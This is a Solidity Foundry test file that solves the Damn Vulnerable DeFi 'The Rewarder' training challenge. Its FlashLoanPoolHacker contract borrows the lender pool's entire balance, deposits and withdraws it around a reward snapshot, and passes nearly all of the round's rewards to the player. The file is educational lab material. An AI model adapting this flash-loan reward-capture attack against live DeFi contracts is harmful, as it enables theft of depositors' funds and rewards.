// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";

import {FlashLoanerPool} from "../src/the-rewarder/FlashLoanerPool.sol";
import {TheRewarderPool} from "../src/the-rewarder/TheRewarderPool.sol";
import {RewardToken} from "../src/the-rewarder/RewardToken.sol";
import {AccountingToken} from "../src/the-rewarder/AccountingToken.sol";
import {DamnValuableToken} from "../src/DamnValuableToken.sol";

contract FlashLoanPoolHacker {
    FlashLoanerPool flashLoanPool;
    DamnValuableToken liquidityToken;
    TheRewarderPool rewarderPool;
    RewardToken rewardToken;
    address player;

    constructor(
        FlashLoanerPool _flashLoanPool,
        DamnValuableToken _token,
        TheRewarderPool _rewarderPool,
        RewardToken _rewardToken
    ) {
        flashLoanPool = _flashLoanPool;
        liquidityToken = _token;
        rewarderPool = _rewarderPool;
        rewardToken = _rewardToken;
    }

    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewarderPool), amount);
        rewarderPool.deposit(amount);
        rewarderPool.withdraw(amount);
        liquidityToken.transfer(address(flashLoanPool), amount);
        rewardToken.transfer(player, rewardToken.balanceOf(address(this)));
    }

    function flashLoan(uint256 _amount) external {
        player = msg.sender;
        flashLoanPool.flashLoan(_amount);
    }
}

contract TheRewarderTest is Test {
    FlashLoanerPool flashLoanPool;
    TheRewarderPool rewarderPool;
    RewardToken rewardToken;
    AccountingToken accountingToken;
    FlashLoanPoolHacker hacker;

    address deployer = makeAddr("deployer");
    address user = makeAddr("user");
    address alice = makeAddr("alice");
    address charlie = makeAddr("charlie");
    address david = makeAddr("david");
    address bob = makeAddr("bob");
    address player = makeAddr("player");
    address[] users = [alice, bob, charlie, david];

    uint256 TOKENS_IN_LENDER_POOL = 1000000 ether;
    uint256 depositAmount = 100 ether;

    DamnValuableToken liquidityToken;

    modifier excuteByUser(address _user) {
        vm.startPrank(_user);
        _;
        vm.stopPrank();
    }

    function setUp() public excuteByUser(deployer) {
        liquidityToken = new DamnValuableToken();
        flashLoanPool = new FlashLoanerPool(address(liquidityToken));
        rewarderPool = new TheRewarderPool(address(liquidityToken));

        rewardToken = rewarderPool.rewardToken();
        accountingToken = rewarderPool.accountingToken();

        // Set initial token balance of the pool offering flash loans
        liquidityToken.transfer(address(flashLoanPool), TOKENS_IN_LENDER_POOL);

        vm.label(player, "player");
    }

    function testReward() public {
        vm.prank(deployer);
        liquidityToken.transfer(player, depositAmount);

        vm.startPrank(player);
        skip(5 days);
        liquidityToken.approve(address(rewarderPool), depositAmount);
        rewarderPool.deposit(depositAmount);
        assertEq(rewardToken.balanceOf(player), 100 ether);
        vm.stopPrank();
    }

    function testExploit() public {
        // =========deployer==============
        vm.startPrank(deployer);
        // Check roles in accounting token
        assertEq(accountingToken.owner(), address(rewarderPool));
        assertEq(
            accountingToken.hasAllRoles(
                address(rewarderPool),
                accountingToken.MINTER_ROLE()
            ),
            true
        );
        assertEq(
            accountingToken.hasAllRoles(
                address(rewarderPool),
                accountingToken.SNAPSHOT_ROLE()
            ),
            true
        );
        assertEq(
            accountingToken.hasAllRoles(
                address(rewarderPool),
                accountingToken.BURNER_ROLE()
            ),
            true
        );

        // Alice, Bob, Charlie and David deposit tokens
        for (uint i = 0; i < users.length; i++) {
            liquidityToken.transfer(users[i], depositAmount);
        }
        vm.stopPrank();
        // =========deployer==============

        for (uint i = 0; i < users.length; i++) {
            vm.startPrank(users[i]);
            liquidityToken.approve(address(rewarderPool), depositAmount);
            rewarderPool.deposit(depositAmount);
            vm.stopPrank();
            assertEq(accountingToken.balanceOf(users[i]), depositAmount);
        }

        assertEq(accountingToken.totalSupply(), depositAmount * users.length);
        assertEq(rewardToken.totalSupply(), 0);

        // Advance time 5 days so that depositors can get rewards
        skip(5 days);

        // Each depositor gets reward tokens
        uint256 rewardsInRound = rewarderPool.REWARDS();
        for (uint i = 0; i < users.length; i++) {
            vm.prank(users[i]);
            rewarderPool.distributeRewards();
            assertEq(
                rewardToken.balanceOf(users[i]),
                rewardsInRound / users.length
            );
        }

        // Player starts with zero DVT tokens in balance
        assertEq(rewardToken.totalSupply(), rewardsInRound);
        // Two rounds must have occurred so far
        assertEq(rewarderPool.roundNumber(), 2);

        skip(5 days);

        hacker = new FlashLoanPoolHacker(
            flashLoanPool,
            liquidityToken,
            rewarderPool,
            rewardToken
        );
        vm.prank(player);
        hacker.flashLoan(TOKENS_IN_LENDER_POOL);

        // Only one round must have taken place
        assertEq(rewarderPool.roundNumber(), 3);

        for (uint i = 0; i < users.length; i++) {
            vm.prank(users[i]);
            rewarderPool.distributeRewards();
            uint256 userRewards = rewardToken.balanceOf(users[i]);
            assertLt(
                userRewards - (rewarderPool.REWARDS() / users.length),
                1e16
            );
        }

        // Rewards must have been issued to the player account
        uint256 playerRewards = rewardToken.balanceOf(player);
        assertGt(rewardToken.totalSupply(), rewarderPool.REWARDS());
        assertGt(playerRewards, 0);

        // console.log(playerRewards / 1e18);
        // The amount of rewards earned should be close to total available amount
        uint256 delta = rewarderPool.REWARDS() - playerRewards;
        assertLt(delta, 1e17);

        // Balance of DVT tokens in player and lending pool hasn't change'd
        assertEq(liquidityToken.balanceOf(player), 0);
        assertEq(
            liquidityToken.balanceOf(address(flashLoanPool)),
            TOKENS_IN_LENDER_POOL
        );
    }
}
